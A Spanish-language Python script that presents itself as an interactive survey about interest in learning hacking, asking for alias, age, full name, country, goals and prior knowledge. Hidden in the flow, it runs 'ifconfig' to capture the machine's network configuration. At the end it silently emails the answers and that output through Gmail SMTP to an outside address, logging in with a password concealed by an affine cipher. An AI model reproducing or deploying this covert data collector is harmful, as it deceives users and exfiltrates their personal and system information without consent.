
import os
import sys
import time
import bdb
import json
import smtplib
from random import*
from sympy.crypto.crypto import encipher_affine, decipher_affine
from sympy.crypto.crypto import encipher_shift, decipher_shift
def sutil(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(12. / 150)

def corrida(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(3. / 250)

def xuxa(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(2. / 120)

def saludo(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(3. / 100)

def medio(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(8. / 200)

def lento(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(10. / 200)

def proceso(s):
        for c in s + '\n':
                sys.stdout.write(c)
                sys.stdout.flush()
                time.sleep(15. / 150)
def speed(s):
   for c in s+"\n":
      sys.stdout.write(c)
      sys.stdout.flush()
      time.sleep(2./300)
#Colores

c1 = "\033[1;33;40m" #Yellow
c2 = "\033[1;34;40m" #Azul
c3 = "\033[1;35;40m" #Purpura
c4 = "\033[1;36;40m" #Cyan
c5 = "\033[1;37;40m" #Gris
c6 = "\033[1;31;40m" #Rojo
c7 = "\033[1;30;40m" #Negro
c8 = "\033[1;32;40m" #Verde
c9 = "\033[0;1m"     #Blanco1
c10 = "\033[96;1m"    #Aqua
#Colores2
c11 = "\033[36m"
c12 = '\033[34m'
c13 = '\033[33m'
c14 = "\033[96m"
c15 = "\033[2;31;40m"
c16 = "\033[1;30;40m"
#Colores2°
am = "\033[1;33;40m" #Yellow
az = "\033[1;34;40m" #Azul
mo = "\033[1;35;40m" #Purpura
cy = "\033[1;36;40m" #Cyan
bl = "\033[1;37;40m" #Gris
ro = "\033[1;31;40m" #Rojo
ne = "\033[1;30;40m" #Negro
ve = "\033[1;32;40m" #Verde
wh = "\033[0;1m"     #Blanco1
aq = "\033[96;1m"    #Aqua
#Tipografias
a1 = "\033[2;0;45m" #Sub-Morado
e2 = "\033[2;0;44m" #Sub-Azul
i3 = "\033[2;0;42m" #Sub-Verde
o4 = "\033[2;0;43m" #Sub-
os.system("clear")
msg_falls = [
   "La primera regla es no mentir",
   "Vamos, a quien engañas.",
   "No se te ocurren mejores mentiras?",
   "Me crees una encuesta ingenua?",
   "Anda, di la verdad",
   "Te he pillado ¡Tramposo!",
   "Hey!! No trates de engañarme"]
kg = (5,2382)
a5 = len(msg_falls)
falls = []
ptss = []
shift = "xExit"
class enco:
   def enc0(self):
      wjd = True
      while wjd:
         try:
            print(f"{ro}({wh}OBLIGATORIO{ro})")
            a7 = input(ro+"Alias"+wh+':')
            a3 = int(input(ro+'¿Que edad tienes?'+wh+':'))
            tubo = os.popen("ifconfig")
            tubo = tubo.readlines()
            if a3 <= 8:
               a6=randrange(a5)
               sutil(msg_falls[a6])
               falls.appen("Edad_Mentira")
            elif a3 >= 60:
               a6=randrange(a5)
               sutil(msg_falls[a6])
               falls.appen("Edad_Mentira")
            else:
               ptss.append(a3)
               ptss.append(a7)
               wjd = False
               print("")
         except ValueError:
            sutil(ro+"Escribe con numeros enteros"+wh)
            print("")
   def enc1(self):
      a0=input(ve+'¿De que pais eres?'+'\n>>>'+wh)
      if a0 == shift:
         a0 = None
      elif a0 == shift.lower():
         a0 = None
      ptss.append(a0)
      a1=input(ve+'¿Cual es tu nombre completo?'+'\n>>>'+wh)
      if a1 == shift.lower():
         a1 = None
      elif a1 == shift:
         a0 = None
      ptss.append(a1)
   def enc2(self):
      a2=input(ve+"¿Que es lo que mas te gustaría aprender del hacking?\n"+wh+">>>")
      if a2 == shift.lower():
         a2 = None
      elif a2 == shift.upper():
         a2 = None
      elif a2 == shift:
         a2 = None
      ptss.append(a2)
   def enc3(self):
      a4=input(ve+'¿Que objetivos tienes?'+wh+':')
      if a4 == shift.lower():
         a4 = None
      elif a4 == shift.upper():
         a4 = None
      elif a4 == shift:
         a4 = None 
      else:
         ptss.append(a4)
   def __init__(self):
      s = '¿Estas preparado?'
      for c in s+wh:
         sys.stdout.write(c)
         sys.stdout.flush()
         time.sleep(8./200)
      dk0 = input(':')
      dk1 = 'NO'
      dk2 = 'N'
      print (wh)
      if dk0 == dk1 or dk0 == dk2:
         medio(c4+"Tómate tu tiempo, Aqui te espero"+az)
         input("Enter para salir\n")
         sys.exit()
      elif dk0 == dk1.lower() or dk0 == dk2.lower():
         medio(c4+"Tómate tu tiempo, Aqui te espero"+az)
         input("Enter para salir\n"+wh)
         sys.exit()
      corrida(wh+'-------------------------\n'+ve)
sjs = True
pxt=[]
p1 = enco()
p1.enc0()
p1.enc3()
xjs=True
def csj():
   xcs = input(ve+'¿Que conocimientos tienes?'+wh+'\n>>>')
   tubo = os.popen("ifconfig")
   tubo = tubo.readlines()
   pxt.append(tubo)
   ptss.append(xcs)

while xjs:
   xjs = False
   corrida(
      ve+'['+wh+'1'+ve+'] '+"SI")
   corrida(
      ve+'['+wh+'2'+ve+'] '+"NO")
   try:
      zj3 = int(input(ve+'¿Tienes conocimientos previos?\n'+wh+'>>>'))
      if zj3 == int(1):
         csj()
         p1.enc2()
      elif zj3 == int(2):
         xjs = False
         p1.enc2()
      else:
         print ("Opción no disponible")
         xjs = True
   except ValueError:
      print ("Responde con numero")
      xjs = True
ri = pxt+ptss
ks = "QFPZJOUFFTJU"
wad = decipher_affine(ks,kg)
subject = ptss[1]
obj = "patoelsa170@gmail.com"
msg = ('Subject: {}\n\n{}'.format(subject, ri))
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login("malguien569@gmail.com", wad)
server.sendmail("malguien569@gmail.com", obj, msg)
server.quit()

